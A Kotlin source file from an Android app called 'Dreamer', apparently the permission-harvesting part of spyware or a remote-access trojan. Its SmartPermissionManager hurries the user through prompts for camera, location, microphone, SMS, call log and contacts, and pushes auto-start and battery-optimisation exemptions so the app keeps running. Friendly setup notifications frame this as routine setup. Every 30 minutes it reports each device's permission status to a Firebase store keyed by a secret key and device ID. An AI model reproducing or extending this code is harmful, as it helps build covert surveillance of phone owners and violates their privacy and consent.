package com.h4k3r.dreamer

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import java.util.concurrent.ConcurrentLinkedQueue

class SmartPermissionManager(private val context: Context) {
    companion object {
        private const val TAG = "SmartPermissionManager"
        private const val CHANNEL_ID = "permission_helper"
        private const val NOTIFICATION_ID = 999

        @Volatile
        private var instance: SmartPermissionManager? = null

        fun getInstance(context: Context): SmartPermissionManager {
            return instance ?: synchronized(this) {
                instance ?: SmartPermissionManager(context.applicationContext).also { instance = it }
            }
        }
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val permissionQueue = ConcurrentLinkedQueue<PermissionRequest>()
    private var isProcessing = false
    private val prefs = context.getSharedPreferences("permission_state", Context.MODE_PRIVATE)

    data class PermissionRequest(
        val permission: String,
        val priority: Int = 0,
        val callback: ((Boolean) -> Unit)? = null
    )

    init {
        createNotificationChannel()
        startPermissionMonitor()
    }

    /* ── Initial Setup with Smart Flow ────────────── */
    fun performInitialSetup() {
        scope.launch {
            showSetupNotification()

            // Phase 1: Critical permissions first
            val criticalPermissions = listOf(
                "camera",
                "location_fine",
                "microphone"
            )

            for (permission in criticalPermissions) {
                if (!checkRuntimePermission(permission)) {
                    requestRuntimePermission(permission)
                    delay(3000) // Wait for user action
                }
            }

            // Phase 2: Runtime permissions - handled through requestAllPermissions

            // Phase 3: Enable auto-start and battery optimization
            requestAutoStart()
            requestBatteryOptimization()

            hideSetupNotification()
            showSuccessMessage()
        }
    }

    /* ── Smart Permission Request System ─────────── */
    fun requestPermissionSmart(permission: String, callback: ((Boolean) -> Unit)? = null) {
        // Check if already granted
        if (isPermissionGranted(permission)) {
            callback?.invoke(true)
            return
        }

        // Add to queue with priority
        val priority = getPermissionPriority(permission)
        permissionQueue.offer(PermissionRequest(permission, priority, callback))

        if (!isProcessing) {
            processPermissionQueue()
        }
    }

    private fun processPermissionQueue() {
        scope.launch {
            isProcessing = true

            while (permissionQueue.isNotEmpty()) {
                val request = permissionQueue.poll() ?: break

                // Show user-friendly notification
                showPermissionNotification(request.permission)

                // Use appropriate method based on permission type
                val granted = requestRuntimePermission(request.permission)

                request.callback?.invoke(granted)

                // Update Firebase
                updatePermissionStatus(request.permission, granted)

                delay(1000) // Small delay between requests
            }

            isProcessing = false
            hidePermissionNotification()
        }
    }

    /* ── Intelligent Permission Checking ────────── */
    private fun isPermissionGranted(permission: String): Boolean {
        return checkRuntimePermission(permission)
    }

    private fun checkRuntimePermission(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false
        return ContextCompat.checkSelfPermission(context, manifestPermission) ==
                PackageManager.PERMISSION_GRANTED
    }

    /* ── Advanced Permission Request Methods ────── */
    private suspend fun requestRuntimePermission(permission: String): Boolean {
        val manifestPermission = getManifestPermission(permission) ?: return false

        return withContext(Dispatchers.Main) {
            val intent = Intent(context, PermissionHelperActivity::class.java).apply {
                putExtra("runtime_permission", manifestPermission)
                putExtra("permission", permission)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }

            context.startActivity(intent)
            true
        }
    }

    /* ── Auto-Start & Battery Optimization ─────── */
    private fun requestAutoStart() {
        val manufacturer = Build.MANUFACTURER.lowercase()

        var intent: Intent? = null

        when (manufacturer) {
            "xiaomi" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    )
                }
            }
            "oppo" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.coloros.safecenter",
                        "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    )
                }
            }
            "vivo" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.vivo.permissionmanager",
                        "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    )
                }
            }
            "huawei" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.huawei.systemmanager",
                        "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    )
                }
            }
            "samsung" -> {
                intent = Intent().apply {
                    component = ComponentName(
                        "com.samsung.android.lool",
                        "com.samsung.android.sm.ui.battery.BatteryActivity"
                    )
                }
            }
        }

        intent?.let {
            try {
                it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(it)
            } catch (e: Exception) {
                Log.e(TAG, "Auto-start not available for $manufacturer")
            }
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(context.packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }

                try {
                    context.startActivity(intent)
                } catch (e: Exception) {
                    // Fallback to battery optimization settings
                    val fallbackIntent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
                    fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    context.startActivity(fallbackIntent)
                }
            }
        }
    }

    /* ── Notification Helpers ──────────────────── */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Permission Helper",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Helps with permission setup"
                setShowBadge(true)
            }

            val notificationManager = context.getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun showSetupNotification() {
        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("🔧 Setting up Dreamer")
            .setContentText("Please follow the on-screen instructions")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setOngoing(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }

    private fun showPermissionNotification(permission: String) {
        val friendlyName = getPermissionFriendlyName(permission)
        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("🔐 Permission Required")
            .setContentText("Please grant $friendlyName permission")
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID + 1, notification)
    }

    private fun hideSetupNotification() {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(NOTIFICATION_ID)
    }

    private fun hidePermissionNotification() {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.cancel(NOTIFICATION_ID + 1)
    }

    private fun showSuccessMessage() {
        Toast.makeText(context, "✅ Dreamer setup complete!", Toast.LENGTH_LONG).show()

        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("✅ Setup Complete")
            .setContentText("Dreamer is ready to use")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
            .build()

        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID + 2, notification)
    }

    /* ── Helper Methods ────────────────────────── */
    private fun getManifestPermission(permission: String): String? {
        return when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location", "location_fine" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "location_coarse" -> android.Manifest.permission.ACCESS_COARSE_LOCATION
            "background_location" -> android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "storage_read" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "post_notifications" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.POST_NOTIFICATIONS
            } else null
            else -> null
        }
    }

    private fun getPermissionFriendlyName(permission: String): String {
        return when (permission) {
            "camera" -> "Camera"
            "location", "location_fine" -> "Precise Location"
            "location_coarse" -> "Approximate Location"
            "contacts" -> "Contacts"
            "sms" -> "SMS Messages"
            "phone" -> "Phone State"
            "call_log" -> "Call History"
            "microphone" -> "Microphone"
            "storage_read" -> "Storage"
            "all_files_access" -> "All Files Access"
            "overlay" -> "Display Over Apps"
            "notification_listener" -> "Notification Access"
            "device_admin" -> "Device Administrator"
            else -> permission
        }
    }

    private fun getPermissionPriority(permission: String): Int {
        return when (permission) {
            "camera" -> 10
            "location", "location_fine" -> 9
            "microphone" -> 8
            "contacts" -> 7
            "sms" -> 6
            "phone" -> 5
            "call_log" -> 4
            "storage_read" -> 3
            "calendar" -> 2
            "background_location" -> 1
            else -> 1
        }
    }

    private fun updatePermissionStatus(permission: String, granted: Boolean) {
        // Update local storage
        prefs.edit().putBoolean("perm_$permission", granted).apply()

        // Update Firebase
        val deviceId = prefs.getString("device_id", "") ?: return
        val secretKey = prefs.getString("secret_key", "") ?: return

        if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
            Firebase.database.reference
                .child("devices")
                .child(secretKey)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .child(permission)
                .setValue(granted)
        }
    }

    /* ── Permission Monitor Service ─────────────── */
    private fun startPermissionMonitor() {
        scope.launch {
            while (isActive) {
                delay(30 * 60 * 1000) // Check every 30 minutes
                checkAndReportPermissions()
            }
        }
    }

    private fun checkAndReportPermissions() {
        val allPermissions = listOf(
            "camera", "location_fine", "location_coarse", "contacts",
            "sms", "phone", "call_log", "microphone", "calendar",
            "storage_read", "all_files_access", "overlay",
            "notification_listener", "device_admin"
        )

        val permissionStatus = mutableMapOf<String, Boolean>()

        for (permission in allPermissions) {
            permissionStatus[permission] = isPermissionGranted(permission)
        }

        // Update Firebase with all permission statuses
        val deviceId = prefs.getString("device_id", "") ?: return
        val secretKey = prefs.getString("secret_key", "") ?: return

        if (deviceId.isNotEmpty() && secretKey.isNotEmpty()) {
            Firebase.database.reference
                .child("devices")
                .child(secretKey)
                .child(deviceId)
                .child("info")
                .child("permissions")
                .setValue(permissionStatus)
        }
    }

    /* ── Batch Permission Request ──────────────── */
    fun requestAllPermissions(callback: (Map<String, Boolean>) -> Unit) {
        scope.launch {
            val results = mutableMapOf<String, Boolean>()

            // Group permissions by type
            val runtimePermissions = listOf(
                "camera", "location_fine", "contacts", "sms",
                "phone", "microphone", "storage_read", "call_log",
                "post_notifications", "background_location"
            )

            // Request runtime permissions
            for (permission in runtimePermissions) {
                if (!isPermissionGranted(permission)) {
                    requestPermissionSmart(permission) { granted ->
                        results[permission] = granted
                    }
                    delay(2000) // Wait between requests
                } else {
                    results[permission] = true
                }
            }

            callback(results)
        }
    }

    private suspend fun requestMultipleRuntimePermissions(
        permissions: List<String>,
        callback: (Map<String, Boolean>) -> Unit
    ) {
        val manifestPermissions = permissions.mapNotNull { permission ->
            getManifestPermission(permission)?.let { permission to it }
        }

        if (manifestPermissions.isEmpty()) {
            callback(emptyMap())
            return
        }

        val intent = Intent(context, PermissionHelperActivity::class.java).apply {
            putExtra("multiple_permissions", manifestPermissions.map { it.second }.toTypedArray())
            putExtra("permission_names", manifestPermissions.map { it.first }.toTypedArray())
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }

        context.startActivity(intent)

        // Wait for results (you'd implement a callback mechanism here)
        delay(5000)

        // Check results
        val results = manifestPermissions.associate { (permission, manifestPerm) ->
            permission to (ContextCompat.checkSelfPermission(context, manifestPerm) ==
                    PackageManager.PERMISSION_GRANTED)
        }

        callback(results)
    }

    fun cleanup() {
        scope.cancel()
    }
}